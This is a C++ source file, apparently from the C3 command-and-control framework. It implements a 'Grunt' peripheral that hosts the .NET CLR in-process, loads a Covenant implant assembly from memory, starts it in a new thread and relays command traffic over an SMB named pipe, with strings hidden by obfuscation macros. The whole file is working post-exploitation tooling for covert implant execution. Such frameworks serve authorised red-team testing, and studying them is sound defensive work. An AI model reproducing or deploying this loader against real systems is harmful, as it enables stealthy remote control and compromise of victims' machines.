#include "StdAfx.h"

#if defined (__clang__)
#warning("Compilation of Grunt peripheral is only supported with MSVC")
#elif defined (_MSC_VER)

#include "Grunt.h"

//For loading of CLR
#pragma comment(lib, "mscoree.lib")
#import "mscorlib.tlb" raw_interfaces_only high_property_prefixes("_get", "_put", "_putref") rename("ReportEvent", "InteropServices_ReportEvent") auto_rename

using namespace mscorlib;

//This function will run the .NET assembly
static void RuntimeV4Host(PBYTE pbAssembly, SIZE_T assemblyLen)
{
	HANDLE hHeap = GetProcessHeap();
	HRESULT hr;
	ICLRMetaHost* pMetaHost = NULL;
	ICLRRuntimeInfo* pRuntimeInfo = NULL;
	ICorRuntimeHost* pCorRuntimeHost = NULL;
	IUnknownPtr spAppDomainThunk = NULL;
	_AppDomainPtr spDefaultAppDomain = NULL;
	_AssemblyPtr spAssembly = NULL;
	_TypePtr spType = NULL;
	_variant_t vtEmpty = NULL;
	_variant_t output;
	BSTR bstrStaticMethodName = NULL;
	BSTR bstrClassName = NULL;
	SAFEARRAY* psaTypesArray = NULL;
	SAFEARRAY* psaStaticMethodArgs = NULL;
	SAFEARRAY* arr = NULL;
	PBYTE pbAssemblyIndex = NULL;
	PBYTE pbDataIndex = NULL;
	long index = 0;
	PWSTR wcs = NULL;

	hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_PPV_ARGS(&pMetaHost));
	if (FAILED(hr))
	{
		goto Cleanup;
	}

	hr = pMetaHost->GetRuntime(OBF(L"v4.0.30319"), IID_PPV_ARGS(&pRuntimeInfo));
	if (FAILED(hr))
	{
		goto Cleanup;
	}

	BOOL fLoadable;
	hr = pRuntimeInfo->IsLoadable(&fLoadable);
	if (FAILED(hr))
	{
		goto Cleanup;
	}

	if (!fLoadable)
	{
		goto Cleanup;
	}

	hr = pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_PPV_ARGS(&pCorRuntimeHost));
	if (FAILED(hr))
	{
		goto Cleanup;
	}

	hr = pCorRuntimeHost->Start();
	if (FAILED(hr))
	{
		goto Cleanup;
	}

	hr = pCorRuntimeHost->CreateDomain(OBF(L"AppDomain"), NULL, &spAppDomainThunk);
	if (FAILED(hr))
	{
		goto Cleanup;
	}

	hr = spAppDomainThunk->QueryInterface(IID_PPV_ARGS(&spDefaultAppDomain));
	if (FAILED(hr))
	{
		goto Cleanup;
	}


	SAFEARRAYBOUND bounds[1];
	bounds[0].cElements = static_cast<ULONG>(assemblyLen);
	bounds[0].lLbound = 0;

	arr = SafeArrayCreate(VT_UI1, 1, bounds);
	SafeArrayLock(arr);

	pbAssemblyIndex = pbAssembly;
	pbDataIndex = (PBYTE)arr->pvData;

	while (static_cast<SIZE_T>(pbAssemblyIndex - pbAssembly) < assemblyLen)
		* (BYTE*)pbDataIndex++ = *(BYTE*)pbAssemblyIndex++;

	SafeArrayUnlock(arr);
	hr = spDefaultAppDomain->Load_3(arr, &spAssembly);


	if (FAILED(hr) || spAssembly == NULL)
	{
		goto Cleanup;
	}


	hr = spAssembly->GetTypes(&psaTypesArray);
	if (FAILED(hr))
	{
		goto Cleanup;
	}

	index = 0;
	hr = SafeArrayGetElement(psaTypesArray, &index, &spType);
	if (FAILED(hr) || spType == NULL)
	{
		goto Cleanup;
	}
	bstrStaticMethodName = SysAllocString(L"Execute");

	hr = spType->InvokeMember_3(bstrStaticMethodName, static_cast<BindingFlags>(
		BindingFlags_InvokeMethod | BindingFlags_Static | BindingFlags_Public),
		NULL, vtEmpty, NULL, &output);

	if (FAILED(hr))
	{
		goto Cleanup;
	}

Cleanup:
	if (spDefaultAppDomain)
	{
		pCorRuntimeHost->UnloadDomain(spDefaultAppDomain);
		spDefaultAppDomain = NULL;
	}
	if (pMetaHost)
	{
		pMetaHost->Release();
		pMetaHost = NULL;
	}
	if (pRuntimeInfo)
	{
		pRuntimeInfo->Release();
		pRuntimeInfo = NULL;
	}
	if (pCorRuntimeHost)
	{
		pCorRuntimeHost->Release();
		pCorRuntimeHost = NULL;
	}
	if (psaTypesArray)
	{
		SafeArrayDestroy(psaTypesArray);
		psaTypesArray = NULL;
	}
	if (psaStaticMethodArgs)
	{
		SafeArrayDestroy(psaStaticMethodArgs);
		psaStaticMethodArgs = NULL;
	}
	SysFreeString(bstrClassName);
	SysFreeString(bstrStaticMethodName);
}


FSecure::C3::Interfaces::Peripherals::Grunt::Grunt(ByteView arguments)
{

	auto [pipeName, payload, connectAttempts] = arguments.Read<std::string, ByteVector, uint32_t>();

	BYTE *x = (BYTE *)payload.data();
	SIZE_T len = payload.size();

	//Setup the arguments to run the .NET assembly in a seperate thread.
	namespace SEH = FSecure::WinTools::StructuredExceptionHandling;
	SEH::gruntArgs args;
	args.gruntStager = x;
	args.len = len;
	args.func = RuntimeV4Host;


	// Inject the payload stage into the current process.
	if (!CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(SEH::SehWrapperCov), &args, 0, nullptr))
		throw std::runtime_error{ OBF("Couldn't run payload: ") + std::to_string(GetLastError()) + OBF(".") };

	std::this_thread::sleep_for(std::chrono::milliseconds{ 30 }); // Give Grunt thread time to start pipe.
	for (auto i = 0u; i < connectAttempts; i++)
	{
		try
		{
			m_Pipe = WinTools::AlternatingPipe{ ByteView{ pipeName } };
			return;
		}
		catch (std::exception& e)
		{
			// Sleep between trials.
			Log({ OBF_SEC("Grunt constructor: ") + e.what(), LogMessage::Severity::DebugInformation });
			std::this_thread::sleep_for(std::chrono::milliseconds{ 100 });
		}
	}

	throw std::runtime_error{ OBF("Grunt creation failed") };
}

void FSecure::C3::Interfaces::Peripherals::Grunt::OnCommandFromConnector(ByteView data)
{
	// Get access to write when whole read is done.
	std::unique_lock<std::mutex> lock{ m_Mutex };
	m_ConditionalVariable.wait(lock, [this]() { return !m_ReadingState || m_Close; });

	if(m_Close)
		return;
	// Write to Covenant specific pipe
	m_Pipe->WriteCov(data);

	// Unlock, and block writing until read is done.
	m_ReadingState = true;
	lock.unlock();
	m_ConditionalVariable.notify_one();

}

FSecure::ByteVector FSecure::C3::Interfaces::Peripherals::Grunt::OnReceiveFromPeripheral()
{
	std::unique_lock<std::mutex> lock{ m_Mutex };
	m_ConditionalVariable.wait(lock, [this]() { return m_ReadingState || m_Close; });

	if(m_Close)
		return {};

	// Read
	auto ret = m_Pipe->ReadCov();

	m_ReadingState = false;
	lock.unlock();
	m_ConditionalVariable.notify_one();

	return  ret;

}

void FSecure::C3::Interfaces::Peripherals::Grunt::Close()
{
	FSecure::C3::Device::Close();
	std::scoped_lock lock(m_Mutex);
	m_Close = true;
	m_ConditionalVariable.notify_one();
}


FSecure::ByteView FSecure::C3::Interfaces::Peripherals::Grunt::GetCapability()
{
	return R"(
{
	"create":
	{
		"arguments":
		[
			{
				"type": "string",
				"name": "Pipe name",
				"min": 4,
				"randomize": true,
				"description": "Name of the pipe Beacon uses for communication."
			},
			{
				"type": "int32",
				"min": 1,
				"defaultValue" : 30,
				"name": "Delay",
				"description": "Delay"
			},
			{
				"type": "int32",
				"min": 0,
				"defaultValue" : 30,
				"name": "Jitter",
				"description": "Jitter"
			},
			{
				"type": "int32",
				"min": 10,
				"defaultValue" : 30,
				"name": "Connect Attempts",
				"description": "Number of attempts to connect to SMB Pipe"
			}
		]
	},
	"commands": []
}
)";
}

#endif
